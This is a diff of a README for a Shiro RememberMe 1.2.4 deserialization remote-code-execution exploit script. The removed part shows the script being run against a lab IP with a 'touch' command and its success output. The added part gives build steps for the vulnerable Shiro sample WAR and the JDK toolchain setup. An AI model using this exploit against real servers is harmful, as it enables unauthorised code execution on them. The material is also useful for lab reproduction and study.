@@ -34,28 +34,44 @@ python3 shiro_rce.py
 
 ```
 
-## touch file
+##  get war for samples-web-1.2.4.war
 
 ```
-python3 shiro_rce.py http://10.10.20.166:8080/samples-web-1.2.4/ "touch /tmp/123123123123"
-
-
-   _____ _    _ _____ _____   ____         _____ _____  ___
-  / ____| |  | |_   _|  __ \ / __ \       | ____| ____|/ _ \
- | (___ | |__| | | | | |__) | |  | |______| |__ | |__ | | | |
-  \___ \|  __  | | | |  _  /| |  | |______|___ \|___ \| | | |
-  ____) | |  | |_| |_| | \ \| |__| |       ___) |___) | |_| |
- |_____/|_|  |_|_____|_|  \_\____/       |____/|____/ \___/
-
-            Shiro RememberMe 1.2.4 反序列化漏洞
-
-
-
-2019-10-25 13:43:00
-
-[+] Send POC Success
-[+] Exit Shiro RCE Vuln
+git clone https://github.com/apache/shiro.git
+cd shiro
+git checkout shiro-root-1.2.4
+mvn install
 ```
+#### mvn version
+
+```
+mvn -v
+Apache Maven 3.6.2 (40f52333136460af0dc0d7232c0dc0bcf0d9e117; 2019-08-27T11:06:16-04:00)
+Maven home: /opt/apache-maven-3.6.2
+Java version: 1.8.0_60, vendor: Oracle Corporation, runtime: /opt/jdk1.8.0_60/jre
+Default locale: en_US, platform encoding: UTF-8
+OS name: "linux", version: "4.19.0-kali1-amd64", arch: "amd64", family: "unix"
+
+```
+
+#### cat ~/.m2/toolchains.xml 
+```
+<?xml version="1.0" encoding="UTF8"?>
+<toolchains>
+    <toolchain>
+      <type>jdk</type>
+      <provides>
+        <version>1.6</version>
+        <vendor>sun</vendor>
+      </provides>
+      <configuration>
+           <jdkHome>/opt/jdk/jdk1.6.0_45</jdkHome>
+      </configuration>
+    </toolchain> 
+</toolchains>
+
+```
+
 
 ## Reverse shell
 
